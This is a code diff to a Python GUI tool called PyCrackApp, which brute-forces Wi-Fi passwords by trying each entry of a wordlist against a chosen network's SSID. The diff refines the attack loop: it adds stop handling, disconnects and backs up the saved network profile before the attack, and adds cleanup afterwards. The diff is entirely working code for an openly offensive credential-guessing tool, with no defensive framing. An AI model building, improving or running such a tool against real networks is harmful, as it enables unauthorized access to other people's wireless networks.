@@ -19,6 +19,7 @@ class PyCrackApp(ctk.CTk):
         self.wordlist = []
         self.selected_ssid = None
         self.is_attacking = False
+        self.user_stopped = False
 
         self.create_widgets()
         self.scan_networks()
@@ -103,28 +104,38 @@ class PyCrackApp(ctk.CTk):
     def start_attack_thread(self):
         if not self.is_attacking:
             self.is_attacking = True
-            self.attack_button.configure(text="Stop Attack", command=self.stop_attack)
+            self.user_stopped = False
+            self.attack_button.configure(text="Stop Attack", command=self.request_stop_attack)
             threading.Thread(target=self.run_attack, daemon=True).start()
 
-    def stop_attack(self):
+    def request_stop_attack(self):
+        self.user_stopped = True
         self.is_attacking = False
-        self.attack_button.configure(text="Start Attack", command=self.start_attack_thread)
-        self.log("Attack stopped by user.")
+        self.log("Stopping attack...")
 
     def run_attack(self):
         self.log(f"Starting attack on {self.selected_ssid}...")
-        for password in self.wordlist:
-            if not self.is_attacking:
-                break
-            
-            self.log(f"Trying password: {password}")
-            success = self.wifi_manager.connect_to_network(self.selected_ssid, password)
-            
-            if success:
-                self.log(f"SUCCESS! Password found: {password}")
-                self.stop_attack()
-                return
-        
-        if self.is_attacking:
-            self.log("Attack finished. Password not found in wordlist.")
-            self.stop_attack()
+        self.log("Disconnecting and backing up saved profile to avoid false positives...")
+        found_password = None
+        try:
+            self.wifi_manager.prepare_for_attack(self.selected_ssid)
+            for password in self.wordlist:
+                if not self.is_attacking:
+                    break
+
+                self.log(f"Trying password: {password}")
+                success = self.wifi_manager.connect_to_network(self.selected_ssid, password)
+
+                if success:
+                    found_password = password
+                    self.log(f"SUCCESS! Password found: {password}")
+                    break
+
+            if self.is_attacking and not found_password:
+                self.log("Attack finished. Password not found in wordlist.")
+        finally:
+            self.is_attacking = False
+            self.attack_button.configure(text="Start Attack", command=self.start_attack_thread)
+            self.wifi_manager.cleanup_after_attack(password_found=found_password)
+            if self.user_stopped and not found_password:
+                self.log("Attack stopped by user.")
